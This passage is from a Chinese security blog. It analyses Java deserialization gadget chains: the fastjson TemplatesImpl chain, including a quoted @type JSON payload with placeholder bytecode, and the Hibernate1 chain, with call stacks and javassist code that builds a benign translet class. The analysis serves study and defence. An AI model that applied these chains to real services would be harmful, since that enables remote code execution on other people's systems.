<p>​        在不了解fastjson内部实现的情况下，我们可以构造一个字节数组，通过toJSONString进行序列化，并查看序列化后的结果，可以看到fastjson将字节数组进行base64后输出。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210812094129036.png" alt="image-20210812094129036">.        跟进fastjson序列化代码，首先通过getClass获取对象类型，再找到对应的序列化器，而我们传入的byte数组会交给PrimitiveArraySerializer序列化器进行处理，PrimitiveArraySerializer的write方法，根据数组的类型进行匹配，当匹配到为字节数组，则通过writeByteArray进行base64编码。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210812094740688.png" alt="image-20210812094740688"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210812194941931.png" alt="image-20210812194941931"></p>
<p>​        所以可以通过base64编码解决byte[]传值问题。</p>
<p><strong>为什么getOutputProperties会被执行？</strong></p>
<p>​        虽然有对应的setter方法可以给 <code>_name</code>和<code>_bytecodes</code>属性赋值，但是这些方法都不是public的，所以默认情况下都不能调用，但在fastjson1.2.22引入了一个SupportNonPublicField特性，可以给非public的属性赋值 ,所以要使用这种方式，需要在反序列化时开启这个属性。可是开启了这个属性后，就会调两个参数的parseObject方法，在这个方法中并不会执行toJSon方法，也就是不会调用getter方法。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210812201408245.png" alt="image-20210812201408245"></p>
<p>​        那么为什么网上的payload可以攻击成功呢？    </p>
<p>​        首先看下网上的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  String text1 = <span class="string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"xxxxxxx\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line"><span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br></pre></td></tr></table></figure>

<p>​        在<code>getOutputProperties</code>处打个断点，发现确实可以执行到该方法，并且也没有调用toJSON。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:339, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:302, JSON (com.alibaba.fastjson)</span><br><span class="line">main:44, Test (com.spring)</span><br></pre></td></tr></table></figure>

<p>​        根据调用栈可以看到，还是通过调用setter方法调用的<code>getOutputProperties</code>，这是怎么做到的，查看setValue方法，发现在调用时，将<code>fieldInfo.method</code>属性设置为getOutputProperties。通过前面对于反序列化流程的分析，这个值主要是在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>中设置的。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813092820948.png" alt="image-20210813092820948"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813093152616.png" alt="image-20210813093152616"></p>
<p>​        在构建JavaBeanInfo过程中，会获取构造方法，和属性的public的getter和setter方法，再根据beaninfo的信息通过asm动态生成javabean反序列化器，在反序列化器中只会调用setter方法，不会调用getter方法，那么为什么在这个栗子中getter方法会被调用呢？</p>
<p>​        经过分析，asmEnable属性控制了是否通过asm创建反序列化器，当这个属性为false时，会直接创建<code>JavaBeanDeserializer</code>对象作为反序列化器，而不会通过asm动态生成。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813093744619.png" alt="image-20210813093744619"></p>
<p>​        而在处理outputProperties属性时，由于getOnly属性为true，会将asmEnalbe的值设置为false，也就是不会通过asm动态创建反序列化器。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813093928169.png" alt="image-20210813093928169"></p>
<p>​        在FieldInfo的构造方法中，当方法的参数不为1个时，会给这个属性设置为true。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813094300234.png" alt="image-20210813094300234"></p>
<p>​        原本我猜想是因为<code>getOutputProperties</code>方法只有public的getter方法，没有setter方法所以<code>getOutputProperties</code>才会被设置到method属性中，但我用自己编写的demo测试并没有成功。所以还要分析在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>中，满足什么条件的getter方法才会被设置。可以看到除了要满足以get开头的非静态方法，且参数为空之外，还要满足返回类型是为Map\Collection\AutomicBoolean等类型的子类或者实现类。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813095254988.png" alt="image-20210813095254988"></p>
<p>​        而<code>getOutputProperties</code>的返回类型Properties其父类正好是Map的实现类，因此满足条件。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813095537523.png" alt="image-20210813095537523"></p>
<p>​        上面我们已经分析了getOutputProperties对反序列化过程改变的原因，现在由于使用JavaBeanDeserializer构建反序列化器，之后的行为也会发生一些改变，在JavaBeanDeserializer中，首先会创建一个实例。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813103623363.png" alt="image-20210813103623363"></p>
<p>​        下面循环给实例的属性赋值，首先从sortedFieldDeserializers中解析反序列化器，并判断这些反序列化器的类型是否为基本类型，如果是基本类型则读取对应字段的内容进行处理，如果不是则跳过。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813110100329.png" alt="image-20210813110100329"></p>
<p>​        下面通过词法解析获取key的内容，判断key的内容是否为$ref或@type等引用类型，如果不是则通过parseFiled解析value的内容并赋值给object对象。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813111157386.png" alt="image-20210813111157386"></p>
<p>​        在<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code>中获取字段的反序列化器并通过parseFiled进行解析。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813111508572.png" alt="image-20210813111508572"></p>
<p>​        在<code>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</code>中，通过反序列化器对value的内容进行处理后，通过setValue将值赋值给对象。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813111758681.png" alt="image-20210813111758681"></p>
<p>​        当getOnly为true且method的返回值为Map的子类或者实现类时，会通过反射调用调用对应的方法。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813112008054.png" alt="image-20210813112008054"></p>
<p><strong>为什么设置了SupportNonPublicField后可以完成利用？</strong></p>
<p>​        在<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code>中会解析字段的值，如果没有设置<code>Feature.SupportNonPublicField</code>属性，则只会在smartMatch中通过之前解析到的sortedFieldDeserializers寻找反序列化器，不会通过其他方式获取Filed反序列化器。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813122104986.png" alt="image-20210813122104986"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813121742456.png" alt="image-20210813121742456"></p>
<p>​        最后我们对TemplateImpl这种利用方式做一个总结，首先由于 _bytecodes和 _name属性的setter方法不是public的，所以默认情况下无法调用，因此需要在parseObject加上SupportNonPublicField，但是加上这个设置后就无法通过toJSON调用getter方法，但是getOutputProperties返回类型是Map的子类，所以在javaBeanInfo.build的过程中，可以得到getOutputProperties方法并设置到filedInfo中，由于getOutputProperties没有一个参数的方法，所以不会通过asm动态构建反序列化器而是使用JavaBeanDeserializer构造，当解析到OutputProperties属性时，通过反射调用了getOutputProperties方法完成利用。据作者所说，这个利用链是参考jackson反序列化利用链找到的，我没了解过jackson是如何解析json数据的，可能他们的解析存在一种共性，所以导致利用链也可以迁移。</p>
<h3 id="AutoType如何影响反序列化过程？"><a href="#AutoType如何影响反序列化过程？" class="headerlink" title="AutoType如何影响反序列化过程？"></a>AutoType如何影响反序列化过程？</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">hibernate1利用链分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-07-31 13:05:31" itemprop="dateCreated datePublished" datetime="2021-07-31T13:05:31+08:00">2021-07-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-09-17 10:10:06" itemprop="dateModified" datetime="2021-09-17T10:10:06+08:00">2021-09-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E5%88%A9%E7%94%A8%E9%93%BE/" itemprop="url" rel="index">
                    <span itemprop="name">利用链</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E5%88%A9%E7%94%A8%E9%93%BE/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index">
                    <span itemprop="name">反序列化</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        最近做项目刚好遇到了反序列化漏洞，在项目中依赖了hibernate组件，借此机会分析下hibernate利用链。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​        首先看下最终反序列化漏洞的触发点，这个漏洞的触发点在<code>org.hibernate.property.BasicPropertyAccessor.BasicGetter#get</code>中，在这这个方法中使用了method.invoke反射调用。这里的method是从属性中获取的，因此是可控的，所以下来需要找到可以控制target参数的点。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731132141740-16277089018891.png" alt="image-20210731132141740"></p>
<p>​        在<code>org.hibernate.tuple.component.AbstractComponentTuplizer#getPropertyValue</code>中调用了get方法，其中getters属性为Getter接口类型的数组，他的实现类中包含了BasicGetter，所以只要这里的getters属性中传入的是BasicGetter对象，根据java的多态原则，实际上会调用到BasicGetter的get方法。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731151006436.png" alt="image-20210731151006436"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731151055144.png" alt="image-20210731151055144"></p>
<p>​        由于<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>类是抽象类，不能通过newInstance获取对象，因此只能先获取其子类，通过子类的getPropertyValue方法调用get方法。比如<code>org.hibernate.tuple.component.PojoComponentTuplizer</code>类，子类实现中并没有重写两个参数的getPropertyValue方法，创建子类后传入两个参数调用getPropertyValue方法，会自动调用父类的getPropertyValue方法。</p>
<p>​        在<code>org.hibernate.type.ComponentType#getHashCode(java.lang.Object)</code>中调用了getPropertyValue方法。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731162742814.png" alt="image-20210731162742814"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731162751228.png" alt="image-20210731162751228"></p>
<p>​        最后在<code>org.hibernate.engine.spi.TypedValue</code>中的readObject中调用了initTransients，而initTransients中调用了getHashCode，所以整条链就串起来了。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731163100120.png" alt="image-20210731163100120"></p>
<p>​        但是仅仅这样还不够，我们要充分理解这条调用链，得先了解下面的几个问题。</p>
<h3 id="漏洞疑问"><a href="#漏洞疑问" class="headerlink" title="漏洞疑问"></a>漏洞疑问</h3><h4 id="如何给method属性赋值？"><a href="#如何给method属性赋值？" class="headerlink" title="如何给method属性赋值？"></a><strong>如何给method属性赋值？</strong></h4><p>​        在BasicGetter中，method的属性是transient修饰的，也就是说当我们通过writeObject去给method属性赋值时，是不会将method属性的内容写入到序列化数据中的。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210802175802216.png" alt="image-20210802175802216"></p>
<p>​        先说结论吧，在BasicGetter中定义了readResolve方法，在反序列化的过程中会自动调用这个方法，先看下这个方法的定义。调用createGetter方法获取一个BasicSetter对象，之所以写在readResolve中，主要是为了让序列化和反序列化过程中，BasicGetter对象保持单例。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210802192603173.png" alt="image-20210802192603173"></p>
<p>​        在编写程序时，有时候我们希望某个对象是单例模式，比如spring中的bean,并且这个对象是可以进行序列化和反序列化的，当我们正常去写单例模式，进行序列化和反序列化后，实际上得到的已经不是一个对象了，可以通过下面的栗子进行证明。</p>
<p>来自：<a href="https://zhuanlan.zhihu.com/p/136769959" target="_blank" rel="noopener">单例、序列化和readResolve()方法</a></p>
<p>​    首先写一个类，为了让这个类保持单例模式，只有通过getInstance方法才能获取到实例，不能通过构造方法创建实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungrySingleton</span>  <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungrySingleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HungrySingleton hungry = <span class="keyword">new</span> HungrySingleton();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hungry;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        下面写一个测试代码,测试序列化后的对象和序列化之前的对象是否相等。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HungrySingleton s1 = HungrySingleton.getInstance();</span><br><span class="line">        HungrySingleton s2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将s1序列化到磁盘</span></span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"a.obj"</span>);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            oos.writeObject(s1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"a.obj"</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            <span class="comment">// 从磁盘反序列化</span></span><br><span class="line">            s2 = (HungrySingleton) ois.readObject();</span><br><span class="line">            System.out.println(s1==s2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        实际结果为false，可以证明反序列化后的对象和反序列化前的对象不是一个对象。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210802194019766.png" alt="image-20210802194019766"></p>
<p>​        下面在<code>HungrySingleton</code>中加上readResolve方法，再次运行项目，可以看到反序列化后的对象和序列化的对象是一个对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> hungry;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803085606856-16279521673471.png" alt="image-20210803085606856"></p>
<p>​        上面我们证明了如果存在readResolve方法，在反序列化的过程中会自动调用readResolve(),放到hibernate利用链中来讲，可以通过readResolve方法给method属性赋值,大致的调用栈如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BasicPropertyAccessor.getSetterOrNull(Class, String)  (org.hibernate.property)</span><br><span class="line">    BasicPropertyAccessor.getSetterOrNull(Class, String)(<span class="number">2</span> usages)  (org.hibernate.property)</span><br><span class="line">    BasicPropertyAccessor.createSetter(Class, String)  (org.hibernate.property)</span><br><span class="line">        BasicSetter in BasicPropertyAccessor.readResolve()  (org.hibernate.property)</span><br></pre></td></tr></table></figure>

<p>​        在<code>getGetterOrNull</code>方法中，通过getterMethod方法获取method对象，并通过BasicGetter的构造方法为该对象赋值。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803121506054.png" alt="image-20210803121506054"></p>
<p>​        <code>org.hibernate.property.BasicPropertyAccessor#getterMethod</code>遍历theClass中的所有方法，查找以get或is开头的并且去掉get或is后和propertyName相同的method并返回。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803121709809.png" alt="image-20210803121709809"></p>
<p>​        theClass是从哪里传入的，经过跟代码发现是从clazz属性中传入的而propertyName也是可以通过构造方法设置的，所以可以通过控制这两个属性来间接给method属性传值。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803122558877.png" alt="image-20210803122558877"></p>
<h4 id="为什么要使用TemplatesImpl来利用？"><a href="#为什么要使用TemplatesImpl来利用？" class="headerlink" title="为什么要使用TemplatesImpl来利用？"></a><strong>为什么要使用TemplatesImpl来利用？</strong></h4><p>​        看网上Hibernate1利用链的分析文章，最终是将结果导向了TemplatesImpl类来完成利用，但是实际经过我们的分析，其实只要是满足下面几点都是可以利用的。</p>
<ul>
<li>存在无参的public访问权限的getter或is方法</li>
<li>通过getter或is方法可以间接执行代码或者执行命令</li>
</ul>
<p>对于TemplatesImpl利用链之前并没有了解过，所以也借此机会分析下TemplatesImpl为什么可以完成利用。</p>
<p>​        首先看下TemplatesImpl能被利用的根本原因，重写了defineClass可以从字节数组加载class对象，当然defineClass后并不会执行静态方法或者代码块,只有通过newInstance构造时，才会执行构造方法和静态代码块。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803130758635.png" alt="image-20210803130758635"></p>
<p>​        所以要想利用这个链，光靠defineClass是不够的，还要找到newinstance的点。于是找到了如下调用链。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">	TemplatesImpl.defineTransletClasses() </span><br><span class="line">    	TemplatesImpl.getTransletInstance()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803132953121.png" alt="image-20210803132953121"></p>
<p>​        而_class属性对应的Class对象是通过 _bytecodes属性的内容通过defineClass加载后得到的。并且 _name属性的内容不能为空，否则不会继续执行getTransletInstance方法。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803133152087.png" alt="image-20210803133152087"></p>
<p>​        所以下来我们要给 _name和 _bytecodes赋值，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#TemplatesImpl(byte[][], java.lang.String, java.util.Properties, int, com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl)</code>可以做到这一点。</p>
<p>​        通过这个构造方法，首先可以给_bytecodes属性赋值，其次在init方法中，会将transletName的值赋给 _name属性。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803134344646.png" alt="image-20210803134344646"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803134443903.png" alt="image-20210803134443903"></p>
<p>​        在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code>中会去判断defineClass加载的类是否为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类，如果不是则会抛出异常不会执行newInstance操作，因此我们构造的类必须是AbstractTranslet的子类。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803153842077.png" alt="image-20210803153842077"></p>
<p>​        最后需要注意的是getTransletInstance方法是private修饰的，也就是说不能直接通过invoke调用，所以要找到一个public的getter方法串到getTransletInstance,查看调用链，找到了getOutputProperties方法，所以只要通过invoke调用getOutputProperties即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getTransletInstance</span><br><span class="line">    TemplatesImpl.newTransformer</span><br><span class="line">        TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803153357589.png" alt="image-20210803153357589"></p>
<h4 id="如何构造动态Class？"><a href="#如何构造动态Class？" class="headerlink" title="如何构造动态Class？"></a><strong>如何构造动态Class？</strong></h4><p>​        根据上述的需求，我们需要动态构造一个Class并且在它的无参构造方法写上我们想要执行的代码，可以通过javasist来实现，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        String clazzName = <span class="string">"test666"</span>;</span><br><span class="line">        CtClass targetClass = pool.makeClass(clazzName);</span><br><span class="line">targetClass.setSuperclass(pool.get(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>));</span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[] &#123;&#125;, targetClass);</span><br><span class="line">        cons.setBody(<span class="string">"&#123;System.out.println(\"Hello World!!!\");&#125;"</span>);</span><br><span class="line">        targetClass.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteArray = targetClass.toBytecode();</span><br><span class="line">        FileOutputStream output = <span class="keyword">new</span> FileOutputStream(<span class="string">"D:\\test666.class"</span>);</span><br><span class="line">        output.write(byteArray);</span><br></pre></td></tr></table></figure>

<p>​        生成的Class内容如下。</p>
